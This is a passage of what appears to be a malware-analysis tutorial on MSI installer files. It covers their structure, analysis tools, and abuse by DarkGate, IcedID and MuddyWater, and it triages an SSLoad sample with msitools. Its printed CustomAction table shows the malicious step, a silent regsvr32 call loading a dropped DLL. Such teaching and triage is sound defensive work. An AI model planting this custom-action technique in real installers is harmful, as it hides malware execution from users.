+&lt;li&gt;&lt;strong&gt;&lt;code&gt;.msi&lt;/code&gt;:&lt;/strong&gt; The primary extension for Microsoft Installer package files.
+Contains the installation database and the necessary instructions for
+installing the software.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;.mst&lt;/code&gt;:&lt;/strong&gt; Windows Installer Transform files. Used to modify or customize
+MSI files without altering the original package.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;.msm&lt;/code&gt;:&lt;/strong&gt; Merge Module files. Used to deliver shared components and ensure
+that the same versions of shared files are installed across multiple
+applications.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;.msp&lt;/code&gt;:&lt;/strong&gt; Windows Installer Patch files. Used to apply updates or fixes to
+installed applications.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;.cab&lt;/code&gt;:&lt;/strong&gt; Cabinet files. Used to compress and package multiple files into a
+single file for easier distribution.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;MSI-Based Installers&lt;span class="hx:absolute hx:-mt-20" id="msi-based-installers"&gt;&lt;/span&gt;
+&lt;a href="#msi-based-installers" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;People use third-party tools to create MSI files because they offer a
+standardized software installation format, simplifying creation, maintenance,
+and removal across multiple systems, especially in enterprise environments.
+These tools also integrate seamlessly with enterprise deployment systems,
+facilitating centralized control and automated deployment.&lt;/p&gt;
+&lt;p&gt;There are several products that support the MSI format. We will describe the
+most common software:&lt;/p&gt;
+&lt;h3&gt;Advanced Installer&lt;span class="hx:absolute hx:-mt-20" id="advanced-installer"&gt;&lt;/span&gt;
+&lt;a href="#advanced-installer" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;a href="https://www.advancedinstaller.com/"target="_blank" rel="noopener"&gt;Advanced Installer&lt;/a&gt; uses MSI (Microsoft
+Installer) as one of its primary installer formats. Advanced Installer&amp;rsquo;s use of
+MSI includes powerful tools for creating and editing MSI packages and an
+intuitive graphical user interface for viewing and modifying MSI elements like
+file structure, registry entries, etc.&lt;/p&gt;
+&lt;p&gt;Advanced Installer offers many useful features, even in its free edition -
+which makes it easy for threat actors to abuse it. The software supports
+creating MSI packages even in its free edition and can repackage EXE installers
+as MSI files. Additionally, it supports modern Windows technologies and can
+create installers for various formats beyond MSI, including MSIX, App-V, and
+more. Advanced Installer also provides features for silent installations of
+both MSI and EXE files.&lt;/p&gt;
+&lt;h3&gt;InstallShield&lt;span class="hx:absolute hx:-mt-20" id="installshield"&gt;&lt;/span&gt;
+&lt;a href="#installshield" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;&lt;a href="https://www.revenera.com/install/products/installshield"target="_blank" rel="noopener"&gt;InstallShield&lt;/a&gt; is a
+software tool used to create installers for Windows applications. It helps
+developers produce installation packages, including MSI (Windows Installer)
+packages. InstallShield can create MSI files that are installed on end-user
+systems using the Windows Installer service. While InstallShield generates the
+installation packages, Windows Installer performs the actual installation on
+the user&amp;rsquo;s system. InstallShield offers various project types, with the Basic
+MSI Project being a popular option for creating Windows Installer packages.
+Although other tools like WiX (Windows Installer XML) can also generate MSI
+files, InstallShield remains a widely used commercial solution. Beyond creating
+MSI files, InstallShield provides features such as creating MSIX packages,
+integrating with Visual Studio, and supporting advanced installer capabilities.&lt;/p&gt;
+&lt;h2&gt;Tools for Manually Analyzing an MSI File&lt;span class="hx:absolute hx:-mt-20" id="tools-for-manually-analyzing-an-msi-file"&gt;&lt;/span&gt;
+&lt;a href="#tools-for-manually-analyzing-an-msi-file" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Several tools can be used to analyze MSI files:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://wiki.gnome.org/msitools"target="_blank" rel="noopener"&gt;msitools&lt;/a&gt;: This Linux package includes
+utilities like &lt;code&gt;msiinfo&lt;/code&gt; and &lt;code&gt;msidump&lt;/code&gt; that can be used to examine MSI files.
+It allows you to enumerate tables and streams, dump table contents, and
+extract data from MSI files.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/mgeeky/msidump"target="_blank" rel="noopener"&gt;msidump&lt;/a&gt;: A tool developed by Mgeeky that
+analyzes malicious MSI packages. It can extract files, streams, and binary
+data, and incorporates YARA scanning. It&amp;rsquo;s particularly useful for quick
+triage and detailed examination of potentially malicious MSIs.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://lessmsi.activescott.com/"target="_blank" rel="noopener"&gt;lessmsi&lt;/a&gt;: This is a utility with both a
+graphical user interface and a command-line interface. It can be used to view
+and extract the contents of MSI files. It also features a Windows Explorer
+integration for easy extraction and an MSI table viewer.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://apps.microsoft.com/detail/9mztr9qs01gn?hl=en-us&amp;amp;gl=NL"target="_blank" rel="noopener"&gt;MSI Viewer&lt;/a&gt;:
+Available from the Microsoft Store, this app allows you to view the contents
+of MSI installer files and merge modules. It can also extract files without
+needing to run the installer.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/msi/orca-exe"target="_blank" rel="noopener"&gt;Orca&lt;/a&gt;: A
+graphical user interface (GUI) tool developed by Microsoft for analyzing and
+editing MSI files. Orca allows users to open MSI files and view their
+internal structure, including tables, properties, and other components of the
+installation package.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;MSI in the Wild&lt;span class="hx:absolute hx:-mt-20" id="msi-in-the-wild"&gt;&lt;/span&gt;
+&lt;a href="#msi-in-the-wild" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;MSI files can be very useful from the perspective of threat actors. First, MSI
+files are a common tool for installing a wide variety of software, making them
+a perfect target for masquerading malicious payloads and abusing their
+popularity. Next, MSI files offer multiple handy features for installing
+software. Still, at the same time, they can be used to secretly execute
+malicious payloads without the user knowing or noticing it.&lt;/p&gt;
+&lt;p&gt;Common examples of threats that use MSI files in their campaigns are:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://www.trendmicro.com/en_us/research/24/c/cve-2024-21412--darkgate-operators-exploit-microsoft-windows-sma.html"target="_blank" rel="noopener"&gt;DarkGate&lt;/a&gt;:
+Uses MSI files that masquerade as a legitimate installation, such as Notion
+or Apple iTunes. It contains DLL sideloading that delivers the DarkGate
+payload.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://nucleon-security.com/security-insights/how-maze-abuse-legitimate-installer-to-trick-your-defense/"target="_blank" rel="noopener"&gt;Maze Ransomware&lt;/a&gt;:
+Abuses the Custom Action to execute a malicious DLL.&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.trendmicro.com/en_us/research/22/l/icedid-botnet-distributors-abuse-google-ppc-to-distribute-malware.html"target="_blank" rel="noopener"&gt;IcedID&lt;/a&gt;:
+Abuses MSI files in several ways. It is often distributed via malicious
+Office documents or ZIP files containing MSI files, tricking users into
+installing the malware. Distributors create MSI files masquerading as
+installers for legitimate software like AnyDesk or Adobe products and promote
+them through Google Ads. Once executed, the MSI files drop several files and
+use &lt;code&gt;rundll32.exe&lt;/code&gt; to run the malicious loader routine. IcedID uses
+&lt;code&gt;msiexec.exe&lt;/code&gt; to mask its activities, helping it blend in with legitimate
+processes. These MSI files deliver the initial IcedID loader, which then
+fetches the main payload, often a backdoor. The use of MSI files helps IcedID
+evade some security measures and establish persistence through methods like
+scheduled tasks.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Malware developers frequently abuse MSI installers to execute malicious
+payloads by leveraging the flexibility and capabilities of Windows Installer
+technology. They also often use custom actions in MSI files to execute
+malicious code. Custom actions can run executables, scripts, or DLLs during
+installation, allowing threat actors to execute and inject malicious code into
+running processes.&lt;/p&gt;
+&lt;p&gt;By design, MSI installers can embed various types of files, including
+executables and DLLs. These embedded files can contain malicious payloads that
+are extracted and executed as part of the installation process. In addition,
+these DLLs can be used to alter the execution flow by
+&lt;a href="https://attack.mitre.org/techniques/T1574/001/"target="_blank" rel="noopener"&gt;DLL Hijacking&lt;/a&gt; or
+&lt;a href="https://attack.mitre.org/techniques/T1574/002/"target="_blank" rel="noopener"&gt;DLL Sideloading&lt;/a&gt;.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Binary Table&lt;/strong&gt;: Storing malware in the &lt;code&gt;Binary&lt;/code&gt; table and executing it as
+part of the installation routine is a common tactic. The malware is disguised
+as a necessary component of the software being installed.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;MSI installers have numerous features and capabilities that can be useful for
+threat actors. For instance, MSI installers often run with elevated privileges,
+which can be abused to perform actions that require administrative rights.
+Attackers can also use the silent installation options to deploy malware
+without user interaction or awareness.&lt;/p&gt;
+&lt;h2&gt;Hands-On Analysis of a Malicious MSI File&lt;span class="hx:absolute hx:-mt-20" id="hands-on-analysis-of-a-malicious-msi-file"&gt;&lt;/span&gt;
+&lt;a href="#hands-on-analysis-of-a-malicious-msi-file" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Let&amp;rsquo;s take a look at a malicious MSI file that was part of a campaign that
+delivered SSLoad malware. SSLoad is a malware written in Rust that collects
+information about compromised victims and sends it to the C2. For more details
+about the campaign,
+&lt;a href="../../../blog/2024/06/ssload-technical-malware-analysis/"&gt;check our write-up&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;We will examine the installer file using &lt;strong&gt;msitools&lt;/strong&gt;. Our goal is to identify
+and extract files that are being executed by the installer and are not part of
+a legitimate installation.&lt;/p&gt;
+&lt;p&gt;The msitools package can be installed for
+&lt;a href="https://wiki.gnome.org/msitools"target="_blank" rel="noopener"&gt;Linux&lt;/a&gt; and
+&lt;a href="https://formulae.brew.sh/formula/msitools"target="_blank" rel="noopener"&gt;Mac&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;The sha256 of the MSI file:
+&lt;a href="https://analyze.intezer.com/files/90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750"target="_blank" rel="noopener"&gt;&lt;code&gt;90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;First, let&amp;rsquo;s examine the metadata of the file:&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;msiinfo suminfo 90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750.sample
+Title: Installation Database
+Subject: MS SharePoint
+Author: Akamai Technology
+Keywords: Installer, MSI, Database
+Comments: This installer database contains the logic and data required to install MS SharePoint.
+Template: *;1033*
+Last author:
+Revision number (UUID): {B61C58BB-6B98-4501-8BF7-0D9C8D568301}
+Last printed: Fri Dec 11 06:47:44 2009
+Created: Fri Dec 11 06:47:44 2009
+Last saved: Fri Sep 18 10:06:51 2020
+Version: 200 (c8)
+Source: 10 (a)
+Application: MS SharePoint
+Security: 0 (0)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Based on the output, we can understand that the malicious file tries to
+masquerade as an installer of MS SharePoint. The creation and update date can
+help in triage and hunting, however, note that they can be spoofed or altered.&lt;/p&gt;
+&lt;p&gt;Next, examine the list of tables in this MSI file:&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;msiinfo tables 90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750.sample
+_SummaryInformation
+_ForceCodepage
+Patch
+Condition
+AdvtExecuteSequence
+PatchPackage
+FeatureComponents
+_Validation
+AdminExecuteSequence
+ActionText
+AdminUISequence
+TextStyle
+Binary
+File
+Component
+BootstrapperUISequence
+Media
+ComboBox
+Control
+Dialog
+Property
+Error
+Feature
+Directory
+EventMapping
+CheckBox
+ControlCondition
+ControlEvent
+CreateFolder
+CustomAction
+InstallExecuteSequence
+InstallUISequence
+LaunchCondition
+ListBox
+ListView
+RadioButton
+Registry
+UIText
+Upgrade&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;While it might be overwhelming to see all of these tables, we should start our
+analysis from places more prone to abuse, such as the &lt;code&gt;CustomAction&lt;/code&gt; table.
+While many actions are defined in this table, &lt;code&gt;LaunchFile&lt;/code&gt; seems to execute a
+specific DLL file.&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;msiinfo export 90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750.sample CustomAction
+Action Type Source Target ExtendedType
+s72 i2 S72 S0 I4
+CustomAction Action
+AI_DETECT_MODERNWIN 1 aicustact.dll DetectModernWindows
+AI_Init_PatchWelcomeDlg 1 aicustact.dll DoEvents
+AI_Init_WelcomeDlg 1 aicustact.dll DoEvents
+AI_SET_ADMIN 51 AI_ADMIN 1
+AI_InstallModeCheck 1 aicustact.dll UpdateInstallMode
+AI_DOWNGRADE 19 4010
+AI_DpiContentScale 1 aicustact.dll DpiContentScale
+AI_EnableDebugLog 321 aicustact.dll EnableDebugLog
+AI_PREPARE_UPGRADE 65 aicustact.dll PrepareUpgrade
+AI_ResolveKnownFolders 1 aicustact.dll AI_ResolveKnownFolders
+AI_RESTORE_LOCATION 65 aicustact.dll RestoreLocation
+AI_STORE_LOCATION 51 ARPINSTALLLOCATION [APPDIR]
+LaunchFile 1026 viewer.exe C:WindowsSystem32regsvr32.exe /S [LocalAppDataFolder]sharepointMenuEx.dll
+SET_SHORTCUTDIR 307 SHORTCUTDIR [ProgramMenuFolder][ProductName]
+SET_TARGETDIR_TO_APPDIR 51 TARGETDIR [APPDIR]
+AI_CORRECT_INSTALL 51 AI_INSTALL {}
+AI_SET_RESUME 51 AI_RESUME 1
+AI_SET_INSTALL 51 AI_INSTALL 1
+AI_SET_MAINT 51 AI_MAINT 1
+AI_SET_PATCH 51 AI_PATCH 1
+AI_DATA_SETTER 51 CustomActionData [AI_Init_PatchWelcomeDlg]
+AI_DATA_SETTER_1 51 CustomActionData [AI_Init_WelcomeDlg]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Another way to view the files that are part of the installer is by examining
+the &lt;code&gt;File&lt;/code&gt; Table:&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;msiinfo extract 90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750.sample FileTable &amp;gt; FileTable.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;To get the file (&lt;code&gt;MenuEx.dll&lt;/code&gt;), we will use &lt;code&gt;msiextract&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;msiextract --directory extracted_files 90f1511223698f33a086337a6875db3b5d6fbcce06f3195cdd6a8efa90091750.sample&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;The suspicious DLL is in the &lt;code&gt;extracted_files&lt;/code&gt; folder. Analyzing the DLL is
+outside the scope of this blog, but you can read more about it in
+&lt;a href="../../../blog/2024/06/ssload-technical-malware-analysis/"&gt;our blog&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;In this example, we see how the threat actors used the MSI&amp;rsquo;s custom action
+feature to load malicious DLL. We also showed how to analyze MSI files and
+identify this sort of manipulation.&lt;/p&gt;
+&lt;h3&gt;MSI Installer Analysis Using Intezer&lt;span class="hx:absolute hx:-mt-20" id="msi-installer-analysis-using-intezer"&gt;&lt;/span&gt;
+&lt;a href="#msi-installer-analysis-using-intezer" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;So far, we have demonstrated how to investigate MSI files manually. However,
+there is a more efficient method to extract malicious payloads from these and
+other file types. Using &lt;a href="https://intezer.com/forensic-ai-soc/"target="_blank" rel="noopener"&gt;Intezer&lt;/a&gt;, we
+leverage static and dynamic execution combined with robust code and string
+reuse analysis. This powerful approach enables analysts, SOC teams, and
+researchers to quickly identify and classify malicious files from a high volume
+of alerts.&lt;/p&gt;
+&lt;p&gt;Below, we can see the extracted DLL from the MSI installer. The DLL is being
+detected as PhantomLoader.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/docs/how-to-analyze/msi/images/fig1.png" title="Execution of the MSI file in Intezer Analyze." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;Execution of the MSI file in Intezer Analyze.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2&gt;Diffing MSI Files - MSIDIFF&lt;span class="hx:absolute hx:-mt-20" id="diffing-msi-files---msidiff"&gt;&lt;/span&gt;
+&lt;a href="#diffing-msi-files---msidiff" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Let&amp;rsquo;s go back to manual analysis with &lt;strong&gt;msitools&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;The &lt;strong&gt;msidiff&lt;/strong&gt; is a command-line utility part of msitools. It compares two MSI
+files or an MSI file against a directory structure. This utility is useful for
+developers and IT professionals who need to identify differences between
+different versions of MSI packages. It helps to ensure that the changes in the
+installer packages are as intended, aiding in version control and
+troubleshooting.&lt;/p&gt;
+&lt;p&gt;For investigators and researchers, it helps identify differences and changes
+between versions of MSI packages.&lt;/p&gt;
+&lt;p&gt;The utility compares the tables of the input files. It provides a detailed
+comparison report highlighting the differences between the two MSI files or
+between the MSI file and the directory structure. The differences are
+categorized and displayed in a readable format, typically showing:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Table Changes: Differences in the database tables within the MSI files.&lt;/li&gt;
+&lt;li&gt;File Changes: Differences in the files included in the MSI packages.&lt;/li&gt;
+&lt;li&gt;Property Changes: Differences in the properties set within the MSI files.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Each difference is presented in a line-by-line comparison, indicating what has
+been added, removed, or modified. The report helps in pinpointing exactly where
+the changes have occurred, making it easier to manage and verify updates to the
+installation packages.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Example Output&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;An example output might look like this:&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;Table: File
+&amp;#43; FileKey Component_ FileName
+- oldfile comp1 oldfile.txt
+&amp;#43; newfile comp2 newfile.txt
+Table: Property
+- ProductVersion 1.0.0
+&amp;#43; ProductVersion 2.0.0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;In this example:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;In the &lt;code&gt;File&lt;/code&gt; table, &lt;code&gt;oldfile.txt&lt;/code&gt; has been replaced with &lt;code&gt;newfile.txt&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;In the &lt;code&gt;Property&lt;/code&gt; table, the &lt;code&gt;ProductVersion&lt;/code&gt; has been updated from &lt;code&gt;1.0.0&lt;/code&gt;
+to &lt;code&gt;2.0.0&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Note that the file that is specified first will be treated as the old version,
+and the second file will be the newer version.&lt;/p&gt;
+&lt;h3&gt;Real-World Example&lt;span class="hx:absolute hx:-mt-20" id="real-world-example"&gt;&lt;/span&gt;
+&lt;a href="#real-world-example" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;According to HarfangLab&amp;rsquo;s
+&lt;a href="https://harfanglab.io/en/insidethelab/muddywater-rmm-campaign/"target="_blank" rel="noopener"&gt;report&lt;/a&gt;, the
+Iranian state-sponsored group MuddyWater has been using MSI files containing
+Atera Agent, a legitimate remote monitoring and management (RMM) tool, in a
+campaign targeting Israel and other countries. These MSI files were distributed
+via spearphishing emails, with filenames crafted to appear relevant to the
+intended victims, such as &amp;ldquo;Tourism Program&amp;rdquo; and &amp;ldquo;Leonardo Hotels-tourism
+software.&amp;rdquo; Hosted on various file-sharing platforms like Egnyte and Sync.com,
+these MSI files were configured with Atera Agent linked to specific email
+addresses from compromised accounts.&lt;/p&gt;
+&lt;p&gt;Our team identified another variant of the MSI installer that installs Atera
+Agent in the wild.&lt;/p&gt;
+&lt;p&gt;Sha256:
+&lt;a href="https://analyze.intezer.com/files/66ea27e2e043adcfca5352089e2cbe7d4349f1f7e78dd4acefaf451b8c9585c4"target="_blank" rel="noopener"&gt;&lt;code&gt;66ea27e2e043adcfca5352089e2cbe7d4349f1f7e78dd4acefaf451b8c9585c4&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;We wanted to compare it to the installers from the report. We chose the file
+with the sha256: &lt;code&gt;ffbe988fd797cbb9a1eedb705cf00ebc8277cdbd9a21b6efb40a8bc22c7a43f0&lt;/code&gt;&lt;/p&gt;
+&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;msidiff ffbe988fd797cbb9a1eedb705cf00ebc8277cdbd9a21b6efb40a8bc22c7a43f0 66ea27e2e043adcfca5352089e2cbe7d4349f1f7e78dd4acefaf451b8c9585c4
+diff -r -Nup old/CustomAction.idt new/CustomAction.idt
+--- old/CustomAction.idt 2024-07-08 11:40:27
+&amp;#43;&amp;#43;&amp;#43; new/CustomAction.idt 2024-07-08 11:40:27
+@@ -1,6 &amp;#43;1,11 @@ CustomAction Action
+Action Type Source Target ExtendedType
+s72 i2 S72 S255 I4
+CustomAction Action
+&amp;#43;GenerateAgentId 2049 AlphaControlAgentInstallationBinary GenerateAgentId
+&amp;#43;ReportInstallationStart 2049 AlphaControlAgentInstallationBinary ReportMsiStart
+&amp;#43;ReportInstallationEnd 2049 AlphaControlAgentInstallationBinary ReportMsiEnd
+&amp;#43;ReportInstallationFailure 2049 AlphaControlAgentInstallationBinary ReportMsiFailure
+&amp;#43;ReportInstallationUserCancel 2049 AlphaControlAgentInstallationBinary ReportMsiUserCancel
+SetCustomActionPropertyValues 51 PostUninstallCleanup SKIPCLEANUP=[SKIPCLEANUP]
+PostUninstallCleanup 3137 AlphaControlAgentInstallationBinary PostUninstallCleanup
+PormptInstallationDialog 2049 AlphaControlAgentInstallationBinary ShouldContinueInstallation
+@@ -10,6 &amp;#43;15,6 @@ oldVersionUninstall 3170 INSTALLFOLDER unins000.exe /V
+KillAteraTaskQuiet 3137 WixCA WixQuietExec
+KillAteraService 3234 INSTALLFOLDER sc delete AteraAgent
+oldVersionUninstall 3170 INSTALLFOLDER unins000.exe /VERYSILENT
